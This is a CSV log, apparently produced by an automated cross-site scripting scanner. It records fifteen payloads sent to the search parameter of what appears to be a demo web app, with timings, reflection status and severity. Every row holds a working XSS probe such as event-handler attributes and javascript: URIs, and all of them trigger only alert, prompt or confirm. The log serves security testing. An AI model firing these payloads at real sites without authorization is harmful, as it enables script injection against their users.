Payload_Start_Time,Payload_End_Time,Duration_Seconds,Target_URL,HTTP_Method,Parameter,Payload,Reflection_Type,Browser_Verified,XSS_Event_Type,Severity
2026-01-10 17:58:52.776,2026-01-10 17:58:52.948,0.173,https://demo-knsl.onrender.com/search,GET,q,<input onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:52.703,2026-01-10 17:58:52.956,0.253,https://demo-knsl.onrender.com/search,GET,q,<body onload=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:52.898,2026-01-10 17:58:52.961,0.064,https://demo-knsl.onrender.com/search,GET,q,<input type=button value=xss onclick=alert(1)>,NO_REFLECTION,No,,Info
2026-01-10 17:58:52.771,2026-01-10 17:58:53.023,0.253,https://demo-knsl.onrender.com/search,GET,q,<body onload=confirm(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:52.836,2026-01-10 17:58:53.104,0.268,https://demo-knsl.onrender.com/search,GET,q,<input type=text value=x onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:52.943,2026-01-10 17:58:53.108,0.165,https://demo-knsl.onrender.com/search,GET,q,<iframe src=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:52.948,2026-01-10 17:58:53.116,0.167,https://demo-knsl.onrender.com/search,GET,q,"<iframe src=""javascript:alert(1)"">",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:52.956,2026-01-10 17:58:53.120,0.164,https://demo-knsl.onrender.com/search,GET,q,<iframe onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:52.961,2026-01-10 17:58:53.124,0.163,https://demo-knsl.onrender.com/search,GET,q,<iframe/onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:53.023,2026-01-10 17:58:53.130,0.107,https://demo-knsl.onrender.com/search,GET,q,"<iframe  rc=""data:text/html,<script>alert(1)</script>"">",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:53.120,2026-01-10 17:58:53.186,0.066,https://demo-knsl.onrender.com/search,GET,q,<details open ontoggle=prompt(1)>,NO_REFLECTION,No,,Info
2026-01-10 17:58:53.104,2026-01-10 17:58:53.216,0.113,https://demo-knsl.onrender.com/search,GET,q,'-alert(1)-',RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:53.108,2026-01-10 17:58:53.225,0.116,https://demo-knsl.onrender.com/search,GET,q,<details open ontoggle=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:53.116,2026-01-10 17:58:53.230,0.115,https://demo-knsl.onrender.com/search,GET,q,<details ontoggle=alert(1)><summary>xss</summary></details>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:53.124,2026-01-10 17:58:53.236,0.111,https://demo-knsl.onrender.com/search,GET,q,<object data=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
